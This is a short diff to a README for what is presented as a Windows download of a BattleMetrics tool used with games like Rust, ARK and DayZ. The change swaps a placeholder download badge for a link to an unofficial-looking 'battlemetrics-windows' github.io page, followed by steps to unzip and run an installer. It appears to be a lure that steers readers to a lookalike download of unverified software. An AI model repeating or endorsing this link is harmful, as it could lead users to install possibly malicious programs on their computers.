@@ -8,7 +8,7 @@ It’s widely used in games like **Rust, ARK: Survival Evolved, and DayZ**, maki
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://battlemetrics-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
